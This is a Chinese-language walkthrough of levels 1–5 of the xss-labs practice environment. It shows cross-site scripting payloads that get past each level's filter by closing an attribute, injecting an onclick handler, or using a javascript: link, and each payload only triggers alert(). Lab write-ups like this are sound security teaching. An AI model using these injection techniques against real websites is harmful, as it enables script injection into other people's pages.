## xss-labs level 1-5

### level1

代码中没有对输入进行任何过滤，在参数中输入任意代码即可

```html
<script>alert('level1')</script>
```



### level2

输入第一关的代码进行测试，发现没有成功

右键查看源码，发现输入的内容被放在 input 标签的 value属性里：

```html
<input name=keyword  value="<script>alert("level2")</script>">
```



可以构造代码，闭合掉inout标签，然后注入代码：

```html
"/><script>alert("level2")</script>
```



### level3

输入第一关的代码进行测试，失败后查看源码：

```html
<input name=keyword  value='&lt;script&gt;alert('level1')&lt;/script&gt;'>	
```



发现 `< >` 的部分都被转义了，可以通过使用事件函数来触发：

```html
' onclick='alert(/level3/)
```



### level4

输入第一关的代码进行测试，失败后查看源码：

```html
<input name=keyword  value="scriptalert('level1')/script">
```



发现 `< >` 的部分都被替换了，同样可以通过使用事件函数来触发：

注意这一关闭合双双引号！

```html
" onclick="alert(/level4/)
```



### level5

输入第一关的代码进行测试，失败后查看源码：

```html
<input name=keyword  value="<scr_ipt>alert('level1')</script>">
```



发现 script 部分被过滤，尝试使用事件注入

```html
<input name=keyword  value="" o_nclick="alert(/level5/)">
```

onclick 也被过滤，但是其中的 `<>` 没有被过滤，可以尝试使用a标签注入：

```html
"/> <a href="javascript:alert(/level5/)">level5</a>
```